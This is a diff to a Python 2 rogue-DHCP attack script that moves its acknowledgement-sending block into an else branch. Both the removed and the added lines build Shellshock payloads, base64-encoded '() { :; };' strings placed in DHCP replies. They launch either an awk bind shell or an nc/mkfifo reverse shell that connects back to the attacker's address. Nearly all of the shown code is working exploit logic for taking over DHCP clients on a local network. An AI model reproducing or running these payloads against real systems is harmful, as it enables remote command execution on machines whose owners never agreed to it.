@@ -202,38 +202,39 @@ def dhcp_reply(request):
                 SOCK.send(nak_packet)
                 print "[INFO] Send nak response!"
 
-            net_settings = "/bin/ip addr add " + requested_ip + \
-                           "/" + network_mask + " dev eth0;"
+            else:
+                net_settings = "/bin/ip addr add " + requested_ip + \
+                               "/" + network_mask + " dev eth0;"
 
-            if args.shellshock_command is not None:
-                b64command = b64encode(net_settings + args.shellshock_command)
-                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64command + ")"
-                if len(shellshock_url) > 255:
-                    print "[ERROR] Len of command is very big!"
-                    shellshock_url = "A"
+                if args.shellshock_command is not None:
+                    b64command = b64encode(net_settings + args.shellshock_command)
+                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64command + ")"
+                    if len(shellshock_url) > 255:
+                        print "[ERROR] Len of command is very big!"
+                        shellshock_url = "A"
 
-            if args.bind_shell:
-                bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                             "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-                b64shell = b64encode(net_settings + bind_shell)
-                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+                if args.bind_shell:
+                    bind_shell = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                                 "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+                    b64shell = b64encode(net_settings + bind_shell)
+                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
-            if args.reverse_shell:
-                reverse_shell = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                                your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-                b64shell = b64encode(net_settings + reverse_shell)
-                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
+                if args.reverse_shell:
+                    reverse_shell = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                                    your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+                    b64shell = b64encode(net_settings + reverse_shell)
+                    shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + b64shell + ")"
 
-            if request[DHCP].options[0][1] == 3:
-                print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                      " || requested ip: " + requested_ip
-            if request[DHCP].options[0][1] == 8:
-                print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
-                      " || requested ip: " + requested_ip
+                if request[DHCP].options[0][1] == 3:
+                    print "DHCP REQUEST from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                          " || requested ip: " + requested_ip
+                if request[DHCP].options[0][1] == 8:
+                    print "DHCP INFORM from: " + target_mac_address + " || transaction id: " + hex(transaction_id) + \
+                          " || requested ip: " + requested_ip
 
-            ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
-            SOCK.send(ack_packet)
-            print "[INFO] Send ack response!"
+                ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
+                SOCK.send(ack_packet)
+                print "[INFO] Send ack response!"
 
         SOCK.close()
 
